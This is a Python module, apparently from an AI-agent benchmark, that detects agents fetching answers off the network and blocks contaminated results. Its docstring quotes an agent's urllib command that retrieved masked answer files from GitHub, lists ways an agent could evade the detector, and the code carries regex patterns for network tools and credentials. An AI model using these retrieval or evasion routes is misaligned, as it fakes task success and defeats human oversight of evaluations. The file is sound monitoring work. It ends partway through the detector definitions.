"""Did the agent fetch the answer off the internet?  Trajectory-side detection.

SPEC_C3_PARALLEL §3.12 lists `egress_allowlist` as **unenforced**: `confine.py`
gives the agent its own filesystem and process namespaces with `bwrap`, and it
gives the executor an `--internal` docker network with no route off the host —
but the agent is still a host process with an open socket to anywhere, because
the only honest fix is a firewall rule an administrator installs and a harness
must not install one behind their back.  §3.12 says in as many words that
auditing "detects some violations after the fact and is not confinement".

On 2026-08-01 the thing that sentence describes actually happened.  In the C1.5
masked-repository arm — the arm whose whole construction is that the answer
files were REMOVED from the agent's copy of the repository — two agents fetched
them back from the public upstream:

    python3 - <<'PY'
    import urllib.request
    url = 'https://raw.githubusercontent.com/coreshop/CoreShop/2026.x/src/'\\
          'CoreShop/Behat/Context/Setup/CartPriceRuleContext.php'
    print(urllib.request.urlopen(url, timeout=10).read().decode())
    PY

and enumerated the repository tree through `api.github.com` to find out what
else to ask for.  Both rows were then scored as if the agent had written the
code.  Masking the repository is not masking the answer while the network is
open; the arm measures retrieval, not synthesis, for any item where retrieval
succeeded.

This module is the after-the-fact half, built and named as such.  It reads the
persisted trajectories, finds the network calls the agent issued and the
responses that came back, decides each one against a policy that permits the
model endpoint and nothing else, and REFUSES to release a run file that
contains a contaminated row.  It cannot stop the fetch; it can stop the number.

What it does NOT claim.  A detector reads what the agent's tools recorded, so
an agent that wanted to hide could: base64 a hostname, drive a socket from
inside a compiled binary, or route through a process whose command line says
nothing.  Detection is a floor on contamination, never a ceiling, and §3.12's
prevention note stands unchanged.  See `gate()`'s printed epilogue, which says
so every time it runs, including when it passes.

Precision matters as much as recall here, because a gate that cries wolf gets
turned off.  Two design choices come straight out of the data:

* Only the agent's own COMMANDS are strong evidence.  Observations are full of
  URLs the agent never fetched — every CoreShop source file carries a
  `@copyright ... (https://www.coreshop.com)` header, and `cat`-ing one puts
  three URLs in the trajectory.  Measured across the C2 and C3 arms: scanning
  observation text for URLs flags 148 of 155 and 109 of 112 trajectories, all
  of them licence headers.  Scanning commands flags 0 of 155 and 0 of 112 — and
  exactly the 2 known-contaminated C1.5 trajectories.
* An observation counts when its PARENT ACTION was a hit (it is then the
  answer coming back, and worth quoting in the gate output), or when it carries
  a marker that file contents do not produce.  These markers do not all prove
  the same thing: `HTTPError`, `Receiving objects` and curl's progress table
  prove a transfer happened; `Cloning into` proves only an ATTEMPT, because git
  prints it before opening any connection and so it survives a proxy refusal.
  Real evidence, this host: `Cloning into 'coreshop-ref'...` immediately
  followed by `Received HTTP code 403 from proxy after CONNECT`, zero bytes
  moved (rc5 run, 2026-08-23).  Under the current reviewed policy an attempt
  is itself a finding, so this is correct as scored; PR #310
  (`EGRESS_BLOCKED_ATTEMPT_AMENDMENT`, proposed, not yet decided) would score
  an attempt apart from a transfer.

FAIL-CLOSED (gate v2, 2026-08-02).  v1 was fail-OPEN in a way that only shows
up on a trajectory it did not recognise.  `scan_run` cleared `no_trajectory`
the moment the attempt DIRECTORY existed, and the gate computed "assessed"
from that flag alone -- so an attempt directory holding a foreign-format
`trajectory.jsonl` full of `curl https://raw.githubusercontent.com/...` was
counted as assessed and the run passed CLEAN, and a run file with one row that
had events and one that did not printed NOT ASSESSED and still exited 0.  A
gate whose green light means "we found a folder" is worse than no gate: it
launders an absence of evidence into evidence of absence.

So v2 asks three counters to agree before it will call a row assessed:

1. `metadata.trajectory.n_events`, written onto the run row by
   `adapters._trajectory_summary` at generation time -- what was SCORED;
2. a fresh recount here by the adapter's own rule (`*.json` under
   `<conversation>/events/`) -- a second opinion on what is on disk now;
3. what this module actually walked, parsed and scanned.

`n_events > 0` proves nothing on its own.  Two of those counters can agree
while the third says half the record is gone, an event file can sit on disk
and refuse to parse, and a directory can hold a format nobody here has ever
read.  Any of those, plus a directory that is present but empty, makes the
ROW `unassessable` -- a verdict of its own, never a quiet zero, and exit code
4 unless `--allow-unassessed` says otherwise.  Not scored is not zero.

Counter 1 is reconciled DIRECTIONALLY, which is a deliberate departure from
"strict equality everywhere".  A shortfall (fewer events on disk than the row
recorded) means the scored evidence is gone and is fatal.  A surplus is not:
it means the directory was appended to by a later attempt, and everything that
was scored is inside what we read -- reading a superset can only find more
contamination, never less.  Measured on the archive this gate was written for:
c1.5 100/100 rows reconcile exactly; c2 has one row whose cited directory
shrank from 132 events to 2 (a rerun landed on top of it) and that row is
genuinely unassessable; c3 has 100/100 rows with a SURPLUS, because the c3
reruns resumed the same conversation directory, plus 12 rows whose cited
`.rN` directory was moved to `trajectories_superseded/` and is therefore
unreadable.  Strict equality would have made the entire c3 arm unassessable
and the gate would have been switched off within a day -- the precise failure
this module's precision paragraph is about.

A SURPLUS IS ONLY A SUPERSET IF THE SCORED EVIDENCE IS STILL IN IT (gate v3,
2026-08-02).  "Everything that was scored is inside what we read" is a CLAIM,
and v2 made it without checking it -- a count is not an identity.  Reproduced
against v2: score an attempt whose one conversation `convA` holds 2 events and
a violating `curl raw.githubusercontent.com`, and the gate REFUSES (1); then
`rm -rf convA` and drop a fresh `convB` of 5 innocuous events into the same
attempt, and the gate reads 5 > 2, calls it a superset, prints the destroyed
evidence as a NOTE and exits CLEAN (0).  Every trace of the violation is gone
and the run file is releasable.

So the row's own inventory is reconciled too, not just its count.
`adapters._trajectory_summary` writes `metadata.trajectory.conversations` --
the conversation directories the scored attempt actually had -- and the surplus
is measured against the events that survive UNDER THOSE CONVERSATIONS, never
against the attempt total.  A recorded conversation that no longer holds
events means what we read is a DIFFERENT set, not a bigger one, and the row is
`unassessable` with that conversation named.

AND THE INVENTORY IS MADE OF EVENTS, NOT OF NAMES (gate v4, 2026-08-02).  v3
asked `os.path.isdir(<attempt>/<conversation>)` -- it tested the conversation's
NAME.  One token of the v3 repro turns it back into a pass: instead of
`rm -rf convA`, `rm convA/events/*.json`.  The directory survives, empty; the
name is still there; `isdir` says yes; the innocuous `convB` still makes the
attempt total 5 > 2; and v3 prints the "has grown" NOTE and exits CLEAN (0)
with the scored `curl` gone from disk.  So v4 counts the event files still
present under each recorded conversation and requires that sum to be at least
what the row recorded before the surplus may be read as a superset.  An empty
conversation directory is exactly as gone as a deleted one.

Two smaller launderings go with it.  A row that records `n_events` but no
`conversations` list has no inventory to check anything against, so its
surplus cannot be verified as a superset at all: it is `unassessable`, with a
reason saying the row does not name which conversations were scored.  (Every
one of the 451 archived rows carries the list, so this costs nothing today and
stops the check from silently degrading to v2 on the first adapter that
forgets to write it.)  And the `present: false` mismatch below is now skipped
when ANOTHER row of the same item records `present: true` against a directory
the gate actually read -- one crashed attempt row must not make the retry that
succeeded unassessable, and 52 of 100 c1.5 items and 47 of 100 c2 items have
more than one row.

Measured over the same archive: 451/451 rows carry `conversations`; four rows
(1 c2, 3 c3) have fewer events under their recorded conversations than they
recorded, and all four were already unassessable under the evidence-gone rule.
v4 costs zero archived rows and the three arms come out unchanged: c1.5 100
assessed / 2 contaminated (exit 1), c2 99 assessed / 1 unassessable (exit 4),
c3 88 assessed / 12 unassessable with the 88-row superset NOTE (exit 4).

WHAT CONSERVATION STILL CANNOT SEE.  The row records COUNTS and tool/source
HISTOGRAMS, and nothing else.  An in-place substitution that preserves those
statistics within the recorded conversations -- delete an event holding the
fetch, write another with the same `tool_name` in its place -- is UNDETECTABLE
here, because there is nothing on the row that identifies the events
themselves.  True identity needs a recorded content digest (a per-event or
per-conversation hash written at generation time), which no adapter writes
yet.  The conservation check narrows the hole; it does not close it, and this
paragraph should be deleted only by the change that adds the digest.

Also measured, and reported rather than adopted: requiring the recorded
`by_tool` histogram to be a sub-multiset of what survives under the recorded
conversations would flip 20 currently-assessed c3 rows to unassessable.  The
c3 reruns resumed the same conversation directories and rewrote events in
place, so those rows pass the count test and fail the histogram test -- which
is itself evidence that "surplus" is a weaker claim on c3 than the counts make
it look.  It is left out because a change that makes a fifth of an arm
unassessable is a measurement decision, not a gate fix.

The mirror-image hole is closed with it: a row whose own metadata says
`present: false` (or `n_events: 0`) that nevertheless has a conventionally
named attempt directory full of events is a conservation MISMATCH, not a
clean row -- we found a folder the adapter says it never wrote, and one of the
two is lying about which trajectory belongs to this item.  It applies only
where `metadata.trajectory` is present and explicit; a row with no metadata at
all is a row that never claimed anything, and keeps the convention-directory
behaviour the archived c1.5 rows are read with.

RAW-PAYLOAD SWEEP.  The structural passes above read PARSED events.  When an
event will not parse, or a file under the attempt directory is in a format
this module does not know, there is no structure to walk -- so the detector
corpus is run a second time over those files' RAW BYTES, after `redact()`
(scanning before redacting would print the coordinator's api key into the
report).  Two rules keep this from wrecking the precision the rest of the
module bought:

* it is run ONLY over unrecognised files and events that failed to parse.  It
  is never run over parsed observation content: measured over this archive,
  bare-URL detection there flags 148 of 155 C2 and 109 of 112 C3 trajectories
  on CoreShop licence headers alone.  Nothing is lost by not running it,
  because every row whose events all parsed is fully covered by the structural
  pass, and every row where they did not is already `unassessable`.
* every hit it produces is capped at SUSPECT, even when the host is readable
  and denied.  Raw bytes cannot distinguish a command the agent RAN from a URL
  sitting in a comment, and a gate that promotes a byte-match to VIOLATION
  would be asserting more than it read.  The row is refused either way -- as
  unassessable rather than as contaminated.
* and a raw hit NEVER enters `contaminated`, not even under `--strict`, and
  not even when its host is one the policy denies.  A raw hit is evidence the
  scan was incomplete, not evidence of retrieval.  Under v2 `--strict` turned
  every raw hit into a contaminated row: an unrecognised `llm_config.json`
  sitting in an attempt directory -- naming the ALLOWED model endpoint -- was
  reported as "the agent retrieved from the network".  Raw hits already force
  the row unassessable and exit 4 on their own; accusing it as well is a false
  accusation the gate cannot support, and it is the kind of output that gets
  the whole gate switched off.

THE NATIVE-MANIFEST SEAM (2026-08-02; versioned by its own manifest schema,
not by a gate bump -- see the note on EGRESS_GATE_VERSION).  An agent whose
driver
normalizes a foreign evidence stream into the event schema this gate reads is
an agent whose gate would otherwise verify the driver's own output — circular:
a driver that drops a record still passes every counter it wrote itself.  So a
driver that normalizes also PRESERVES the framework's own artifacts (for
aider: the chat markdown and the analytics event log) beside the normalized
events, immutable and declared in a `native_manifest.json` — names, sha256s,
and the counts the native stream can actually witness.  For an attempt
carrying that manifest, this gate additionally:

* verifies every declared file exists with its declared bytes (a moved or
  missing native file is the scored-evidence-is-gone failure, one level up);
* sweeps the declared files' raw bytes with the same detector corpus, after
  `redact()` — hits are kind "raw", capped at SUSPECT, never contamination,
  and are PRINTED (a transcript byte cannot say a fetch ran, and for aider it
  could not have: the framework has no shell tool);
* reconciles the manifest's native counts against the normalized events,
  main-loop against main-loop (`r2t/agents/scanners/` states the exact
  per-agent rules and the F5 findings that shaped them) — a mismatch, a
  missing declared file, or a manifest this gate cannot trust makes the row
  `unassessable`;
* exempts the declared files (and the manifest itself) from the unrecognized
  inventory: they are accounted, not unknown.

An attempt with NO manifest — every archived row — is read by exactly the
code that read it before the seam existed; the selftest pins that path
byte-for-byte, and the manifest handling is reached only behind an
`os.path.isfile` on the manifest's name.

AN XML NAMESPACE URI IS AN IDENTIFIER, NOT A FETCH (2026-08-03).  On the
python-docx arm the gate refused a row for the host
`schemas.openxmlformats.org`, on this command:

    doc.findall('.//{http://schemas.openxmlformats.org/wordprocessingml/'
                '2006/main}style')

which makes no request and cannot: `{uri}localname` is how lxml and
ElementTree SPELL a namespaced tag, and the URI inside those braces is a
name, in the way `com.example.Foo` is a name.  Nothing dereferences it.  The
bare-URL catch-all cannot tell a namespace literal from a target, so on an
OOXML corpus — python-docx, python-pptx — and on any XML-heavy project
(w3.org, purl.org, xmlsoap.org) every correct solution is a contamination
verdict waiting to happen.  A gate that accuses the correct answer is the
`pip install` precision paragraph above, one order of magnitude worse: it
does not merely get switched off, it gets quoted as a retrieval finding.

The fix is a POSITION exemption, never a host one.  A host allowlist would
clear `schemas.openxmlformats.org` in a `curl` too, which is exactly the
fetch an OOXML agent would use to pull an answer off MSDN.  So what is
exempt is a URI-shaped substring in ONE syntactic position, the one the
observed defect actually occupied:

* `{<uri>}<ncname>` — Clark notation, the braces holding the URI and nothing
  else, immediately followed by a name character.

ONE POSITION, AND WHY NOT THREE (2026-08-03, two independent reviews).  The
first cut of this fix also exempted `xmlns="<uri>"` and a URI inside an
`nsmap={...}` / `namespaces={...}` brace group, on the reasoning that lxml
agents write those too.  Both are deleted, and the reasoning that deleted
them is the reasoning to apply to any fourth position anyone proposes:

* MEASURED BENEFIT, ZERO.  Over every command string in both live corpora —
  715 in `docx_bench/a5_cell3`, 22,759 in `coreshop_bench` — Clark notation
  occurs 4 times (the false positive this fix exists for) and `xmlns=` and
  `nsmap=` occur ZERO times.  Neither position has ever suppressed anything.
* MEASURED COST, A REAL FETCH.  `nsmap`/`namespaces` are ordinary Python
  identifiers, and `lxml.etree.parse()` genuinely dereferences an http URL
  (libxml2's nanohttp), while lxml is NOT in the detector corpus.  So
  `namespaces={'w': <ns>, 'gold': 'http://host/steps.py'}; etree.parse(
  namespaces['gold'])` fetched the gold answer and came out CLEAN, where the
  bare-URL catch-all had been the only thing seeing it.  Renaming the dict to
  `NS` made the identical command contaminated: the exemption turned on a
  variable NAME.  `xmlns=` was the same shape of hole with no fetch found
  through it yet.
* Clark notation survives because no fetcher dereferences `{uri}name`: the
  one caller that treats braces as meaningful is curl's own globbing, and
  `curl "{http://host/a}b"` fires `http_client`, which switches the whole
  exemption off.

The exemption is switched OFF entirely the moment anything else in the
same text fires: if `curl`, `wget`, `urlopen`, `git clone`, `pip install` or
any other detector in the corpus matched, every URL in that text is read as
it was yesterday, Clark notation included.  That rule is what keeps the
narrowing from being an evasion.  A command that fetches an answer AND
parses XML is still contaminated, by the host it fetched from, because the
exemption never suppresses a URL that is not itself in Clark position; it
suppresses SPANS, not commands.

What it costs, stated rather than discovered later: a fetcher this corpus
does not know, invoked on a URL written in Clark notation
(`sometool {http://host/a}b`), is now invisible where the bare-URL catch-all
used to see it.  That is a real narrowing of a backstop and it is the price
of not accusing every OOXML solution.  A bare URL is still seen; a URL in a
dict, in a string, in an attribute is still seen; only the
braced-and-suffixed spelling is not.

A RESERVED EXAMPLE-DOMAIN HYPERLINK IS TEST DATA, NOT A FETCH (2026-08-05).
The A5 cell-4 native Aider chat produced a second false-positive family:
`paragraph.add_hyperlink("https://example.com", "link")` and the multiline
`'http://example.com/{}'.format(...)` form.  That python-docx constructor
writes an external relationship into the document and does not dereference
its address.  The rule is again a position, never a host allowlist: only the
quoted first address argument of an explicitly named
`paragraph.add_hyperlink(...)` call, only http(s), and only exact
`example.com`, `example.net`, or `example.org` authorities.  A bare example
URL, a second argument, a different receiver, a non-reserved host, and a host
merely prefixed with `example.com` all remain hits.  The shared kill-switch
turns this rule off when `curl`, `requests`, `urlopen`, or any other detector
fires in the same text.  Unlike Clark notation, this syntax is also recognized
in raw native files: those preserved chat bytes are where the live false
positives occur, and their suppressions are returned and printed rather than
silently discarded.

Every exemption that is APPLIED is reported — `scan_trajectory` records the
host, the position that exempted it and the snippet, `gate` prints an EXEMPT
block naming `NAMESPACE_EXEMPTION_RULES` or `TEST_DATA_LITERAL_RULES` — because
a detector that narrows itself silently is a detector nobody can audit.  That
report is COMPLETE in the one dimension that matters: every distinct host the
rule suppressed anywhere in the run is named, without truncation, because a
suppressed host below a `... and N more` fold is a suppressed host the gate did
not report.  The per-item detail below it is illustrative and says so when it
stops.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import sys
from dataclasses import dataclass, field
from typing import Iterable, Mapping, Optional

# ------------------------------------------------------------------ verdicts

#: Which rules produced a verdict.  v1 = the fail-open gate that scanned only
#: what it recognized: an attempt DIRECTORY existing counted as "assessed", so
#: a foreign-format trajectory passed CLEAN and a mixed run file exited 0.
#: v2 = conservation check, raw-payload sweep, `unassessable`, exit code 4.
#: v3 = a surplus is only read as a superset when every conversation the row
#: recorded is still on disk; a row that recorded NO trajectory and has one is
#: a mismatch; a raw byte-match can no longer contaminate a row under --strict.
#: v4 = that inventory check is made of EVENTS rather than of directory NAMES
#: (v3 asked `isdir`, so emptying a recorded conversation in place passed it);
#: a row that records `n_events` but names no conversations can no longer have
#: its surplus read as a superset; and a `present: false` row no longer refuses
#: an item another row of the same item legitimately recorded.
#: Bump this on ANY change that could turn one gate verdict into another, so a
#: recorded PASS can be traced to the rules that produced it rather than to
#: whatever the module says today.
#:
#: The native-manifest seam (2026-08-02, module docstring) deliberately did
#: NOT bump this, and the reasoning is worth keeping: the seam is reachable
#: only for attempts that carry `native_manifest.json`, which no attempt in
#: existence did when it landed -- so there is no recorded verdict that these
#: rules could re-explain -- and the archived gate output is pinned
#: byte-for-byte INCLUDING the header line that prints this number, so a bump
#: would fail that pin for zero traceability gain.  A manifest-carrying row's
#: rules are traceable through the manifest itself: its scan report carries a
#: `native` block and the manifest declares `r2t.native_manifest/1`, which is
#: the version that seam's rules move under.  The first change that can alter
#: a MANIFEST-LESS row's verdict bumps this to 5.
#:
#: The manifest-REQUIRED rule (final-review blocker 3, same date) is the one
#: deliberate refinement of that sentence: a manifest-less attempt is now
#: unassessable when the ROW's system declares the native contract on its
#: AdapterSpec (aider@1, resolved through the registry).  It does not bump
#: this number, by the same no-recorded-verdict reasoning as the seam
#: itself: no manifest-less row of a contract-declaring system exists
#: anywhere (the archived corpus is openhands@1, which declares none, and
#: every A4 smoke attempt carries its manifest), so there is no recorded
#: verdict these rules could re-explain — and the archived gate output pins,
#: byte-for-byte including this header, still hold.  The first such row that
#: EXISTS will be one this rule refuses, which is the point.
#:
#: THE NAMESPACE EXEMPTION (2026-08-03) HOLDS AT 4, and this is the first
#: change where holding needs an argument rather than an observation, because
#: this one CAN turn a verdict: a python-docx row the gate called contaminated
#: comes out clean.  The argument, in the order a reviewer should rule on it:
#:
#: 1. The bump rule's subject is a RECORDED verdict -- "so a recorded PASS can
#:    be traced to the rules that produced it".  Measured, not assumed: the
#:    archived corpus (`coreshop_bench/artifacts/trajectories`, 31,524 events
#:    across c1.5/c2/c3) contains the string `{http` exactly zero times, and
#:    the pinned gate output over `eval100_openhands_c3.merged_v3.jsonl` is
#:    byte-identical before and after.  There is no published number, and no
#:    released run file, whose verdict these rules re-explain.  The one row
#:    that changes belongs to a cell that has never passed this gate and has
#:    therefore never been released as a capability result -- it is being
#:    gated for the FIRST time, and a first gating is not a re-explanation.
#: 2. Bumping is not free, and what it costs is the traceability it is for.
#:    `protocol_v2/v3/v4.yml` pin `egress_gate_required: 4`, and a protocol
#:    file is IMMUTABLE BY CONTENT: every archived row cites its
#:    `protocol_digest`, so editing the 4 to a 5 would invalidate the digest
#:    hundreds of rows assert.  The alternatives are both worse than the
#:    disease -- bump the constant and leave every P2/P3/P4 cell citing a gate
#:    version that no longer exists, or fork a protocol_v5 whose ONLY
#:    difference is an integer, and then explain why two recipes describing
#:    the same experiment have different digests.
#: 3. So the rules are versioned where the seam above versioned itself: in
#:    their own constants, `NAMESPACE_EXEMPTION_RULES` and
#:    `TEST_DATA_LITERAL_RULES`, which are printed in the gate's EXEMPT block
#:    on every row where the corresponding exemption actually applied.
#:    A row that was exempted carries the rule id in its own report; a row
#:    that was not is byte-identical to yesterday's.  Traceability here is
#:    carried by evidence rather than by an integer, which is the same trade
#:    the native-manifest seam made and for the same reason.
#:
#: The example-domain rule lands under the same disposition: its two affected
#: A5 cell-4 rows had not passed the strict gate or been released as capability
#: results, and every changed first verdict prints `TEST_DATA_LITERAL_RULES`.
#:
#: The dissent is worth recording because it is not silly: `GATE_PHASE_A.md`
#: for cell 3 already quotes "REFUSED (1) ... gate version 4", and a later
#: reader diffing that against a CLEAN at gate version 4 has two documents
#: that disagree while claiming the same rules.  What answers them is that
#: the second document PRINTS its exemption, with the host, the position and
#: the snippet, and names the rule id that produced it -- so the disagreement
#: is explained in the output rather than hidden by a matching integer.  If a
#: reviewer rules the other way, the change is one line here plus a
#: protocol_v5, and this comment is the argument they are overruling.
#:
#: Point 3 is a DEBT, not a free trade, and review found it unpaid: the EXEMPT
#: block truncated, so the evidence this argument spends was evidence the gate
#: did not emit, and neither `gate_version` nor `exempt` is persisted anywhere
#: -- the operator's saved stdout is the only durable record.  The truncation
#: is fixed (the roster in `gate` is complete and unbounded); the persistence
#: is not, and a reader holding this version at 4 is owed that sentence.  The
#: first change that needs a DURABLE per-row rules stamp is the change that
#: bumps this to 5 along with a protocol_v5.
#: Gate 5 is prospective: it combines this retained detector with the
#: coordinator-written proxy journal.  Historical gate-4 attestations keep
#: their own version and validation rules; they are not rescored.
EGRESS_GATE_VERSION = 5

#: The rules the NAMESPACE EXEMPTION moves under, versioned separately from
#: the gate for the reasons in the block above.  Printed by `gate` wherever
#: the exemption applied, so a verdict reached with a narrowed detector says
#: which narrowing it used.  Bump it on any change to what counts as a
#: non-fetching position -- a second position, or a loosening of this one --
#: because that is a change to which strings the gate stops seeing.
#:
#: /1 names ONE position, Clark notation.  The pre-review draft that also
#: exempted `xmlns=` and `nsmap={...}` never gated a released run and never
#: printed this id into an artifact, so removing those two is not a second
#: version of a rule anyone has cited -- it is what /1 turned out to be.  A
#: TIGHTENING after this ships bumps it too: a reader comparing two outputs
#: needs the id to name one rule set, in either direction.
NAMESPACE_EXEMPTION_RULES = "r2t.egress.namespace_exemption/1"

#: The separately-versioned rule for reserved test-data addresses.  Like the
#: namespace rule, this id is printed whenever the detector looks away.  /1
#: admits only an http(s) literal at the first-address position of the known
#: non-fetching python-docx hyperlink constructor, and only on the three
#: example domains reserved for documentation.
TEST_DATA_LITERAL_RULES = "r2t.egress.test_data_literal/1"

#: The hit went to a host the policy names.  The model endpoint, and nothing
#: else, is what "permitted" is for.
PERMITTED = "permitted"

#: A network call to a host the policy does not name.  Everything that is not
#: the model endpoint is denied by nature: the agent has a complete copy of the
#: repository it is allowed to see, so there is nothing legitimate off-host for
#: it to want.
VIOLATION = "violation"

#: Clearly a network call, but the host could not be read out of the command —
#: a shell variable, a heredoc-assembled URL, `composer install`, a bare
#: `http://`.  Reported always and permitted never.  It does not by itself
#: fail the gate (`Policy.strict_suspect` makes it do so), because a rule that
#: fails on `pip install` would be switched off within a day; but it is printed
#: at the top of the output where a reader cannot miss it.
SUSPECT = "suspect"

#: A ROW-level verdict, not a hit-level one: the gate could not READ this
#: row's evidence, so it has nothing to say about it either way.  It is the
#: opposite of PERMITTED and it is not VIOLATION — "not scored is not zero",
#: applied to the gate's own reading.  A row is unassessable when its
#: trajectory is absent, present but empty, holds an event file that will not
#: parse, holds a file in a format this module does not read, or when the
#: three event counters do not reconcile (see the module docstring).
UNASSESSABLE = "unassessable"

#: Matches `adapters._REDACTED` on purpose: a trajectory the driver already
#: scrubbed and a snippet this module scrubs should look the same to a reader.
_REDACTED = "[REDACTED]"

#: Below this a "secret" is more likely a substring of ordinary text than a
#: credential, and blanket-replacing it would corrupt the evidence.
_MIN_SECRET_LEN = 8

#: Snippet budget, per the report contract.  Long enough to show a URL and the
#: call around it, short enough that a hundred of them still read as a report.
SNIPPET_MAX = 200


# ------------------------------------------------------------------ redaction
#
# Redaction runs BEFORE detection, over the whole text, not after it over a
# window.  Redacting a 200-character window can leave the first half of a key
# visible on the other side of the cut, and the offsets of everything found
# before redaction move underneath the substitution.  Scanning already-clean
# text costs one pass and removes the whole class of mistake — this module's
# output is meant to be pasted into a review, and a gate that leaks the
# coordinator's api key while reporting an exfiltration would be its own
# incident.

_SECRET_PATTERNS = (
    # OpenAI-style keys, which is what every endpoint in this benchmark issues.
    (re.compile(r"\bsk-[A-Za-z0-9_\-]{8,}"), _REDACTED),
    # `Authorization: Bearer xxx`, `--header 'x-api-key: xxx'`, `API_KEY=xxx`.
    # The NAME is kept and only the value replaced: "there was a credential
    # here, called this" is evidence; the credential is not.
    (re.compile(r"(?i)\b(authorization|api[_\-]?key|apikey|access[_\-]?token|"
                r"auth[_\-]?token|token|secret|password|passwd)\b(\s*[:=]\s*)"
                r"[\"']?[^\s\"',;&)]+"),
     r"\1\2" + _REDACTED),
    (re.compile(r"(?i)\bbearer\s+[A-Za-z0-9._\-]{8,}"), "Bearer " + _REDACTED),
    # Credentials smuggled through the query string.
    (re.compile(r"(?i)([?&](?:api[_\-]?key|access[_\-]?token|token|key|sig|"
                r"signature)=)[^&\s\"']+"),
     r"\1" + _REDACTED),
    # ...and through the URL's userinfo field.
    (re.compile(r"://[^/\s:@]+:[^/\s@]+@"), "://" + _REDACTED + "@"),
)


def redact(text: str, secrets: Iterable = ()) -> str:
    """Scrub credentials out of trajectory text before anything reads it.

    `secrets` are literal strings known to be secret — the api key out of the
    llm config, typically — and are replaced first, because a literal match is
    certain where a pattern is a guess.
    """
    if not isinstance(text, str):
        return ""
    for needle in sorted({str(s) for s in secrets if s
                          and len(str(s)) >= _MIN_SECRET_LEN},
                         key=len, reverse=True):
        text = text.replace(needle, _REDACTED)
    for pattern, replacement in _SECRET_PATTERNS:
        text = pattern.sub(replacement, text)
    return text


# ------------------------------------------------------------------ detectors

#: A URL, ending at the first character that cannot be inside one.  Quotes are
#: excluded so `urls=['https://a/x','https://b/y']` yields two URLs rather than
#: one; braces are not, so an f-string `https://host/{branch}/file` still
#: yields its host, which is the whole point.
#:
#: The tail is `*` rather than `+` deliberately: a bare `http://` in a command
#: is a network call whose host cannot be read, and the report must say so
#: (SUSPECT) rather than not see it at all.
_URL_RE = re.compile(r"\b(?:https?|ftp|ftps|git|ssh|rsync)://"
                     r"[^\s'\"<>`\\|)\]}]*", re.I)

#: `git@github.com:coreshop/CoreShop.git` — scp-style, no scheme, so `_URL_RE`
#: cannot see it.  Only consulted for detectors that take such a target, since
#: the pattern is loose enough to match ordinary prose otherwise.
_SCP_RE = re.compile(r"\b(?:[\w.\-]+@)"
                     r"([A-Za-z0-9][A-Za-z0-9.\-]*\.[A-Za-z]{2,})"
                     r":(?=[~/\w])")

#: What a hostname may contain.  Anything else — `$HOST`, `{registry}`, a
#: `%s` — means the command built its target at runtime and the trajectory
#: does not record where it went.
_HOST_OK = re.compile(r"^(?:\[[0-9A-Fa-f:.]+\]|"
                      r"[A-Za-z0-9_](?:[A-Za-z0-9_.\-]*[A-Za-z0-9])?)$")

_LOOPBACK = ("localhost", "127.0.0.1", "::1", "[::1]", "0.0.0.0")

# ------------------------------------------------- namespace URIs are names
#
# The ONE position in which a URI-shaped substring is an IDENTIFIER and cannot
# be a fetch target (module docstring).  It is matched SYNTACTICALLY and
# captures the URI itself as group `uri`, so what gets exempted is a SPAN of
# the text -- never a host, and never a whole command.
#
# The URI body deliberately repeats `_URL_RE`'s tail rather than reusing the
# compiled pattern: the exempted span has to line up exactly with what
# `_URL_RE` finds, or a URL match would fall half inside an exempt span.  `}`
# is excluded from the tail by both, which is what makes a Clark-notation URI
# end where its closing brace begins.  That alignment is a COUPLING between two
# separately-maintained patterns, and it is not what the containment test in
# `_exempt_position` relies on: containment is checked, not assumed, and the
# selftest pins the checking (`_exempt_position` refuses a partial overlap)
# precisely so a future edit to either tail cannot open a hole in silence.

_URI_BODY = r"(?:https?|ftp|ftps|git|ssh|rsync)://[^\s'\"<>`\\|)\]}]*"

#: `{http://schemas.openxmlformats.org/...}style` -- James Clark's notation for
#: a qualified name, and what `lxml`/`ElementTree` print and accept.  The
#: braces must hold the URI AND NOTHING ELSE, and a name character must follow
#: the closing brace: `{uri}` on its own is not a qualified name, and
#: `{uri, other}` is a set literal or a shell brace expansion.
#:
#: This is the whole exemption.  `xmlns="uri"` and `nsmap={...}` were in the
#: first cut and are deliberately NOT here; the module docstring records what
#: they measured (zero benefit) and what they cost (a real lxml fetch), and
#: that measurement is the bar a fourth position has to clear.
_CLARK_RE = re.compile(r"\{(?P<uri>" + _URI_BODY + r")\}(?=[A-Za-z_])")

# `Paragraph.add_hyperlink` writes a relationship into a document; it does not
# dereference the address.  The two live false positives were exactly these
# forms, including the multiline `.format(...)` spelling preserved in Aider's
# native chat.  This remains deliberately narrower than "an example.com URL
# in Python": the receiver name, method, first argument, quote boundaries and
# following argument are all part of the position.  A prefix host such as
# `example.com.evil.invalid` cannot match because only a port, path, query or
# fragment may follow the reserved authority.
_EXAMPLE_HYPERLINK_RE = re.compile(
    r"(?<![A-Za-z0-9_])paragraph\s*\.\s*add_hyperlink\s*\(\s*"
    r"(?:(?:address|url)\s*=\s*)?"
    r"[rRuUbBfF]{0,2}(?P<quote>['\"])"
    r"(?P<uri>https?://example\.(?:com|net|org)"
    r"(?::[0-9]{1,5})?(?:[/?#][^\s'\"]*)?)"
    r"(?P=quote)(?:\s*\.format\s*\([^()\n]*\))?\s*(?=,)",
    re.I,
)


def _cmd_position(alternatives: str) -> str:
    """A token where a COMMAND may start, rather than anywhere in the text.

    `cat ~/.ssh/config` is not egress and `shipping` is not `ping`.  A binary
    name only counts at the start of the string, after a newline, or after one
    of the shell's separators, allowing for the usual prefixes.

    Quotes count as separators so that `bash -c "curl $URL"` is seen — an
    inner command with no literal URL is otherwise invisible, and that is a
    hole an agent does not have to be clever to fall into.  The cost is that
    `grep -r "ping" src/` reads as a network call; measured over the C1.5, C2
    and C3 arms that costs zero false positives, and a false SUSPECT is a line
    of output rather than a wrong verdict.
    """
    return (r"(?:\A|[\n;&|(\"'`])\s*"
            r"(?:sudo\s+|nohup\s+|time\s+|env\s+\S+=\S+\s+)*"
            r"(?:" + alternatives + r")\b")


#: Ordered: the FIRST match names the hit's category, so the specific detectors
#: precede the catch-all `url_in_command`.
_DETECTORS = (
    ("python_http", re.compile(
        r"\b(?:urllib\.request|urllib2|urllib3|urlopen|"
        r"requests\.(?:get|post|put|head|delete|request|Session)|"
        r"httpx\b|aiohttp|http\.client|HTTPSConnection|HTTPConnection|"
        r"socket\.create_connection|socket\.socket)\b")),
    ("php_http", re.compile(
        r"\bcurl_exec\s*\(|\b(?:file_get_contents|fopen)\s*\(\s*"
        r"[\"']https?://", re.I)),
    ("http_client", re.compile(_cmd_position(
